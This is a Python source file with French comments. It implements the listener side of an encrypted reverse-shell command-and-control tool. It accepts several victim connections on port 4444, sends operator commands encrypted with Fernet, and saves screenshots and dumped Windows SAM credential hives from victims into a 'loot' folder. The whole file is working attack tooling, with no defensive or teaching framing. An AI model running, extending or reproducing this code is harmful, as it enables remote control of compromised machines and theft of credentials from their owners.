import socket
import os
import sys
import threading
from cryptography.fernet import Fernet 

# On definit l'adresse et le port
HOST = "0.0.0.0"
PORT = 4444


# On charge la cle generee par le script generate_key.py
try:
    with open("secret.key", "rb") as key_file:
        KEY = key_file.read()
    cipher = Fernet(KEY)
except FileNotFoundError:
    print("[-] Fichier secret.key introuvable. Generez-le avec generate_key.py")
    sys.exit(1)


def gerer_client(conn, addr):
    print(f"[+] Nouvelle connexion depuis {addr}")
    
    try:
        # 1. Lire le message d'accueil (hostname - ip) envoye par le client
        # On utilise un timeout pour ne pas bloquer si le client n'envoie rien
        conn.settimeout(2.0)
        try:
            info_client = conn.recv(1024).decode('utf-8')
            print(f"[*] Info client : {info_client}")
        except socket.timeout:
            print("[!] Pas de message d'accueil recu (timeout).")
        finally:
            # On remet le timeout a None pour les commandes interactives
            conn.settimeout(None)

        while True:
            cmd = input(f"Shell@{addr[0]} > ")
            
            if cmd.lower() in ['exit', 'quit']:
                conn.send(b"exit")
                break
            
            cmd_encrypted = cipher.encrypt(cmd.encode("utf-8"))
                
            # On envoie la commande au client
            conn.send(cmd_encrypted)
            
            # 2. Gestion des commandes qui renvoient des fichiers binaires
            if cmd in ["screenshot", "sam"]:
                data = conn.recv(1024 * 1024) # On recoit les bytes
                
                if data:
                    if cmd == "screenshot":
                        nom_fichier = f"loot/screen_{addr[0]}.png"
                    else:
                        nom_fichier = f"loot/sam_{addr[0]}.hive"
                        
                    with open(nom_fichier, "wb") as f:
                        f.write(data)
                    print(f"[+] Fichier sauvegarde dans {nom_fichier}")
                else:
                    print("[-] Erreur : aucune donnee recue.")
            else:
                # 3. Comportement normal pour les commandes texte
                reponse_encrypted = conn.recv(4096)
                if not reponse_encrypted:
                    print("[-] Le client a ferme la connexion.")
                    break
                    
                
                try:
                    reponse = cipher.decrypt(reponse_encrypted).decode("utf-8")
                    print(reponse)
                
                except Exception as e:
                    print(f"[-] Erreur de dechiffrement (le client est-il a jour ?) : {e}")
    finally:
        conn.close()
        print(f"[-] Deconnexion de {addr}")

def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server.bind((HOST, PORT))
        server.listen(5)
        print(f"[*] Serveur en ecoute sur le port {PORT}...")
    except Exception as e:
        print(f"[-] Impossible de demarrer : {e}")
        sys.exit(1)

    # 4. Boucle principale avec gestion multi-OS
    
    try:  # <--- AJOUT ICI
        while True:
            conn, addr = server.accept()
            
            # Si on est sous Windows, on utilise threading
            if os.name == 'nt':
                thread = threading.Thread(target=gerer_client, args=(conn, addr))
                thread.daemon = True
                thread.start()
                print(f"[*] Thread cree pour le client {addr}")
            # Si on est sous Linux (Kali), on utilise fork
            else:
                pid = os.fork()
                if pid == 0:
                    # Processus enfant
                    server.close()
                    gerer_client(conn, addr)
                    sys.exit(0)
                else:
                    # Processus parent
                    conn.close()
                    print(f"[*] Processus fils cree (PID: {pid}) pour le client {addr}")
                    
    except KeyboardInterrupt:  # <--- AJOUT ICI
        print("\n[-] Arret du serveur...")
        server.close()
        sys.exit(0)

if __name__ == "__main__":
    main()